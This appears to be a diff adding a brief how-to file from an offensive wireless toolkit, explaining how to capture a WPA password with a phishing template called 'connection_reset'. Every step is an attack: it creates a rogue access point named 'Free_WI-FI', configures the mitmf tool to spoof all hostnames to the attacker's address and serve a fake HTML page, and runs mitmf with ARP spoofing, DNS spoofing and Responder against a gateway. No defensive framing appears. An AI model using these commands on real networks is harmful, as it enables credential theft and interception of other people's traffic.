@@ -1,0 +1,15 @@
+How to use phishing template "connection_reset" to get WPA password
+
+ - create fake AP (create_apnz)
+	you can create rogue AP without access to internet with -n parameter
+	example: ./create_ap -n wlan0 Free_WI-FI --no--dns
+
+ - edit mitmfnz's config
+	[[[A]]] *.*=<my_ip> # spoof all hosts
+	Serve-Always = Off
+	Serve-Exe = Off
+	Serve-Html = On
+	HtmlFilename = config/responder/connection_reset/ru.html
+
+ - run mitmfnz with right parameters:
+	./mitmf.py -i wlan0 --responder --spoof --dns --arp --gateway 192.168.12.1 [... etc]
